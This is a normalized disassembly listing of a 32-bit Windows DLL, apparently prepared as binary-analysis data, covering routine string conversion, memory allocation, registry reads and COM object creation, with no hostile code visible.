cmp [ ebp - 0x8 ] 0x0
jg r-xdata
jge r-xdata
sub_1006f670
push ebp
mov ebp esp
push 0xffffffff
push sub_1008620b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0xc
call sub_1001f84c
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
push edi
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x1
call [ SysAllocString@IAT ]
mov [ esi ] eax
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0x8007000e
call sub_10035950
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ eax ] esi
test esi esi
jne r-xdata
test edi edi
je r-xdata
push 0x8007000e
call sub_10035950
sub_1006f705
push 0x28
mov eax sub_10085471
call sub_100624bc
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_10013ab8
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1006f790
push ebp
mov ebp esp
push 0xffffffff
push sub_10086868
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x34 ] eax
mov ebx ecx
mov [ ebp - 0x30 ] edi
cmp eax edi
je r-xdata
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] edi
push r--data
mov ecx esi
mov [ esi ] 0x0
call sub_10037e00
cmp ebx edi
je r-xdata
push edi
push edi
push edi
push edi
push ebx
push eax
push edi
push edi
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x30 ] eax
cmp eax edi
je r-xdata
inc eax
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x34 ]
push 0x0
push 0x0
mov edi eax
mov eax [ ebp - 0x30 ]
push eax
push edi
push ebx
push ecx
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
push ebx
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
call sub_10037e00
xor ebx ebx
push edi
push ebx
mov [ ebp - 0x4 ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
lea edx [ ebp - 0x2c ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push edx
mov ecx esi
mov [ esi ] bl
call sub_10021bf0
lea ecx [ ebp - 0x2c ]
call sub_1004c8c0
jmp r-xdata
push edi
push eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push r--data
mov ecx esi
call sub_10001000
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1006f8c4
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1006e88c
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_1006f961
push 0x64
mov eax sub_1008567f
call sub_1003fae8
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
push eax
call sub_10002fc0
mov ebx eax
pop ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_100101d0
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x38 ] eax
je r-xdata
add edi 0x8
push edi
push 0x0
push 0x30
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x60 ] edi
call sub_100578b0
add esp 0xc
push [ ebp - 0x5c ]
movzx ebx ax
mov eax [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x54 ] eax
call sub_10069d0f
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
mov eax [ ebp + 0x18 ]
and eax 0xe00
cmp eax 0x400
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x50 ] 0x8
jmp r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2b
call sub_100578b0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
neg eax
sbb eax eax
and eax 0xa
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x50 ] 0x10
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x49 ] 0x0
call sub_10069d0f
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ eax ] 0x2b
jmp r-xdata
xor ebx ebx
cmp [ ebp - 0x50 ] ebx
je r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2d
call sub_100578b0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
inc eax
mov ecx esi
mov [ ebp - 0x54 ] eax
call sub_1005a5dc
mov [ ebp - 0x6c ] 0xa
cmp [ ebp - 0x50 ] 0xa
je r-xdata
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_1001c121
mov eax [ ebp - 0x64 ]
mov [ eax ] 0x2d
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp - 0x50 ] 0x8
setne al
dec eax
and eax 0xfffffff2
add eax 0x16
mov [ ebp - 0x6c ] eax
jmp r-xdata
mov ecx esi
mov [ ebp - 0x58 ] 0x1
call sub_1005a5dc
push [ ebp - 0x5c ]
mov ecx esi
call sub_10069d0f
test al al
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
lea edx [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x60 ]
push eax
call sub_1005e238
mov edi [ ebp - 0x54 ]
push [ ebp - 0x6c ]
mov [ edi ] al
movsx eax al
push eax
push r--data
call sub_1007f360
add esp 0x14
test eax eax
je r-xdata
mov ecx esi
call sub_1001c121
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x2c ]
push 0x1
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] 0x0
call sub_100405c0
mov eax [ ebp - 0x64 ]
push [ ebp - 0x5c ]
add eax 0x1f
mov ecx esi
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x70 ] eax
call sub_10069d0f
test al al
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x50 ] ebx
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x54 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov [ ebp - 0x50 ] 0x8
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
xor ebx ebx
push ebx
push 0x78
call sub_100578b0
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + ebx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp edi [ ebp - 0x70 ]
jae r-xdata
cmp [ edi ] 0x30
je r-xdata
cmp [ ebp - 0x50 ] ebx
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x54 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ eax ] 0x0
call sub_1002c8c0
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1002c8c0
mov eax [ ebp - 0x50 ]
call sub_1004642f
retn
mov eax [ ebp - 0x54 ]
inc [ ebp - 0x54 ]
mov [ eax ] 0x30
jmp r-xdata
dec ebx
je r-xdata
test ebx ebx
je r-xdata
mov edi [ ebp - 0x68 ]
test di di
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x1
jae r-xdata
inc edi
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x49 ] 0x1
mov ecx esi
mov [ ebp - 0x50 ] 0x10
mov [ ebp - 0x58 ] bl
call sub_1005a5dc
jmp r-xdata
cmp [ ebp - 0x50 ] 0x10
jne r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x58
call sub_100578b0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001c121
test ebx ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax + ebx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + ebx ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + ebx ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x6 ] di
jne r-xdata
mov ecx esi
call sub_1001c121
mov ecx esi
call sub_1005a5dc
push [ ebp - 0x5c ]
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x0
inc ebx
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1004ca10
inc ebx
inc [ eax + ebx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
sub_1006fd00
mov eax [ edi ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi ] eax
call sub_1007f5d0
add esp 0xc
pop esi
retn
push eax
call [ LocalFree@IAT ]
mov [ edi ] 0x0
sub_1006fd40
push ebp
mov ebp esp
push ecx
test esi esi
je r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push edi
lea edx [ ebp - 0x4 ]
mov eax 0x1
call sub_10045930
movzx ecx [ esi ]
or edi 0xffffffff
xor eax eax
test cx cx
je r-xdata
push esi
mov edx 0x7ffffffe
mov eax 0x104
mov ecx ebx
call sub_10072800
test eax eax
jns r-xdata
mov edx [ ebp - 0x4 ]
mov eax 0x50
mov eax 0x4
pop edi
mov esp ebp
pop ebp
retn
movzx ecx [ esi + eax * 2 + 0x2 ]
inc eax
test cx cx
jne r-xdata
mov edi eax
cmp cx dx
jne r-xdata
cmp edi 0xffffffff
je r-xdata
test edi edi
jne r-xdata
cmp edi 0x7ffffffe
jbe r-xdata
lea eax [ edi + 0x2 ]
pop edi
mov esp ebp
pop ebp
retn
push esi
mov edx edi
mov eax 0x104
mov ecx ebx
call sub_10072800
test eax eax
jns r-xdata
xor eax eax
mov [ ebx ] ax
mov eax 0x3
pop edi
mov esp ebp
pop ebp
retn
lea ecx [ esi + edi * 2 + 0x2 ]
push ecx
call [ StrToIntW@IAT ]
movzx eax ax
test ax ax
jne r-xdata
mov eax 0x3
pop edi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx ] ax
xor eax eax
pop edi
mov esp ebp
pop ebp
retn
sub_1006fe30
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
xor esi esi
push 0x4
mov [ edi ] esi
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ edi + 0xc ] esi
mov [ edi + 0x14 ] eax
push esi
mov [ edi + 0x18 ] esi
mov [ edi + 0x1c ] esi
call [ GetProcessHeap@IAT ]
mov ebx [ HeapAlloc@IAT ]
push eax
call ebx
cmp eax esi
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ edi + 0x1c ] eax
inc [ eax ]
push 0x4
push esi
mov [ edi + 0x20 ] esi
mov [ edi + 0x24 ] esi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax esi
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ edi + 0x24 ] eax
inc [ eax ]
push 0x4
push esi
mov [ edi + 0x28 ] esi
mov [ edi + 0x2c ] esi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax esi
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ edi + 0x2c ] eax
inc [ eax ]
push 0x4
push esi
mov [ edi + 0x30 ] esi
mov [ edi + 0x34 ] esi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax esi
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ edi + 0x34 ] eax
inc [ eax ]
push 0x4
push esi
mov [ edi + 0x38 ] esi
mov [ edi + 0x3c ] esi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax esi
je r-xdata
dec [ ebx ]
jne r-xdata
mov eax [ esi + 0x4 ]
dec [ eax ]
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push esi
mov [ edi + 0x3c ] eax
inc [ eax ]
mov eax [ ebp + 0x8 ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
mov esi edi
call sub_1000be60
mov eax [ ebp + 0x18 ]
mov ecx [ eax ]
mov ebx [ eax + 0x4 ]
inc [ ebx ]
lea eax [ ebp - 0xc ]
lea esi [ edi + 0x20 ]
mov [ ebp - 0xc ] ecx
cmp esi eax
je r-xdata
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn 0x14
test ecx ecx
je r-xdata
mov [ esi ] ecx
mov [ esi + 0x4 ] ebx
inc [ ebx ]
mov esi [ esi ]
test esi esi
je r-xdata
push ebx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov esi ecx
call sub_10055530
mov eax [ edi + 0x24 ]
lea esi [ edi + 0x20 ]
test eax eax
je r-xdata
call sub_10055530
mov ecx [ ebp - 0xc ]
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ ebp - 0xc ]
sub_1006ff82
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x18 ]
lea ecx [ ebp + 0x10 ]
call sub_1003c746
dec [ ebp + 0x1c ]
jne r-xdata
sub_1006ffad
mov edi edi
push ebp
mov ebp esp
mov dl [ ebp + 0xc ]
push esi
cmp [ ebp + 0x10 ] dl
jg r-xdata
cmp [ ebp + 0x14 ] dl
jg r-xdata
movsx ecx [ ebp + 0x10 ]
movsx eax dl
lea esi [ ecx + 0x9 ]
cmp eax esi
jg r-xdata
cmp [ ebp + 0x18 ] dl
jg r-xdata
movsx ecx [ ebp + 0x14 ]
movsx eax dl
lea esi [ ecx + 0x5 ]
cmp eax esi
jg r-xdata
sub eax ecx
jmp r-xdata
or eax 0xffffffff
movsx ecx [ ebp + 0x18 ]
movsx eax dl
lea edx [ ecx + 0x5 ]
cmp eax edx
jle r-xdata
sub eax ecx
add eax 0xa
jmp r-xdata
pop esi
pop ebp
retn
sub_10070000
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x60 ]
mov ecx esi
call sub_10013a20
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_10070030
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
cmp ebx 0x7ffffffe
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_1000831a
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
push eax
push ebx
call sub_10041880
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
test ebx ebx
jne r-xdata
cmp ebx 0x8
jae r-xdata
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov [ esi + 0x10 ] ebx
cmp eax 0x8
jb r-xdata
push edi
mov edi [ esi + 0x10 ]
cmp ebx edi
jae r-xdata
xor eax eax
mov [ esi ] ax
mov esi [ esi ]
cmp eax 0x8
jb r-xdata
mov edi ebx
xor edx edx
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x7
xor ecx ecx
mov [ esi + edi * 2 ] dx
cmp ecx ebx
pop edi
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_100187af
mov ebx [ ebp + 0x8 ]
add esp 0x4
lea ecx [ edi + edi ]
push ecx
push ebx
push esi
call sub_1007f5d0
add esp 0xc
sub_10070110
push ebp
mov ebp esp
sub esp 0x6ac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov esi ecx
mov edi edx
mov [ ebp - 0x6ac ] edi
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
test edi edi
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
lea edx [ ebp - 0x6a8 ]
mov eax 0x1
call sub_100550b0
lea edx [ ebp - 0x6a4 ]
mov eax 0x4
call sub_100550b0
lea edx [ ebp - 0x6a0 ]
mov eax 0x2
call sub_100550b0
mov eax edx
push eax
push esi
call [ StrStrW@IAT ]
lea ecx [ ebp - 0x69c ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
xor ebx ebx
sub esi ecx
nop
lea ebx [ ebp - 0x6a4 ]
xor edi edi
sub ebx ecx
nop
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
jne r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0x6a0 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_1004e6c0
test eax eax
jne r-xdata
pop ebx
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
pop ebx
pop edi
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push esi
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_1004e6c0
test eax eax
jne r-xdata
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0x6a0 ]
push ecx
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x6a4 ]
push eax
call sub_1004e6c0
test eax eax
je r-xdata
push edi
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_1004e6c0
test eax eax
jne r-xdata
lea edx [ ebp - 0x6a4 ]
push edx
call sub_1004e6c0
test eax eax
jne r-xdata
mov edi [ ebp - 0x6ac ]
lea eax [ ebp - 0x6a0 ]
push eax
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x6a8 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x69c ]
call sub_1004e6c0
test eax eax
jne r-xdata
lea ecx [ ebp - 0x6a4 ]
push ecx
call sub_1004e6c0
test eax eax
jne r-xdata
lea eax [ ebp - 0x6a0 ]
push eax
call sub_1004e6c0
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_1004e6c0
test eax eax
jne r-xdata
lea edx [ ebp - 0x84 ]
call sub_100550b0
lea edx [ ebp - 0x6a8 ]
push edx
push 0x20119
push 0x0
lea eax [ ebp - 0x84 ]
push eax
push 0x80000002
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x6a8 ]
push ecx
mov edx ebx
push edx
call sub_100197c0
add esp 0x8
pop ebx
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10070390
test ebx ebx
je r-xdata
retn
mov eax [ edi ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi ] eax
call sub_1007f5d0
add esp 0xc
pop esi
push eax
call [ LocalFree@IAT ]
mov [ edi ] 0x0
sub_100703d0
push ebp
mov ebp esp
push 0xffffffff
push sub_100879a0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov esi [ ebp + 0x8 ]
cmp esi 0x1ffffff
jbe r-xdata
mov eax [ edi + 0x8 ]
sub eax [ edi ]
sar eax 0x7
cmp eax esi
jae r-xdata
push r--data
call sub_1000831a
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx esi
call sub_10018580
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
mov edx [ edi + 0x4 ]
mov ecx [ edi ]
push ebx
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_10069b80
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
mov ebx ecx
add esp 0xc
sub ebx eax
mov [ ebp - 0x18 ] ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
shl esi 0x7
add esi eax
and ebx 0xffffff80
add ebx eax
mov [ edi + 0x8 ] esi
mov [ edi + 0x4 ] ebx
mov [ edi ] eax
mov esi eax
cmp esi ecx
je r-xdata
mov ecx [ edi ]
push ecx
call sub_100187af
mov esi [ ebp + 0x8 ]
add esp 0x4
call sub_1002fbb0
sub esi 0xffffff80
cmp esi [ ebp - 0x18 ]
jne r-xdata
sub_100704c0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087d68
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x34 ] eax
mov ebx ecx
mov [ ebp - 0x30 ] edi
cmp eax edi
je r-xdata
push edi
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
push r--data
mov ecx esi
mov [ esi ] ax
call sub_1005ddc0
cmp ebx edi
je r-xdata
push edi
push edi
push ebx
push eax
push edi
push edi
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x30 ] eax
cmp eax edi
je r-xdata
push r--data
mov ecx esi
call sub_10054d00
jmp r-xdata
lea eax [ eax + eax + 0x2 ]
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x34 ]
push ecx
mov edi eax
push edi
push ebx
push edx
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push ebx
xor eax eax
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] ax
call sub_1005ddc0
xor ebx ebx
push edi
push ebx
mov [ ebp - 0x4 ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
lea edx [ ebp - 0x2c ]
mov [ esi ] cx
push edx
mov ecx esi
call sub_100649e0
lea ecx [ ebp - 0x2c ]
call sub_10019100
jmp r-xdata
push edi
push eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10070600
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
push edi
cmp [ ebx + 0x4 ] esi
jbe r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edi [ eax + esi * 4 ]
mov ecx [ ebp + 0xc ]
mov edx [ edi + 0x4 ]
push ecx
push edx
call sub_100385c3
add esp 0x8
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
cmp esi [ ebx + 0x4 ]
jb r-xdata
sub_10070640
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x34 ] eax
add eax 0x1c
push eax
push r--data
push 0x1
push 0x0
push r--data
mov ebx edx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] eax
call [ CoCreateInstance@IAT ]
test eax eax
jns r-xdata
push esi
push edi
push r--data
mov [ ebp - 0x28 ] 0x1
xor edi edi
call [ lstrlenA@IAT ]
mov ecx r--data
mov esi ebx
cmp eax 0x4
jb r-xdata
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
test eax eax
je r-xdata
mov edx [ esi ]
cmp edx [ ecx ]
jne r-xdata
mov ecx [ ebp - 0x34 ]
push r--data
mov [ ecx + 0x140 ] 0x1
call [ lstrlenA@IAT ]
mov edi eax
mov dl [ ecx ]
cmp dl [ esi ]
jne r-xdata
mov eax [ ebp - 0x2c ]
sub eax edi
push eax
add ebx edi
push ebx
call [ SysAllocStringByteLen@IAT ]
mov edx [ ebp - 0x30 ]
mov esi eax
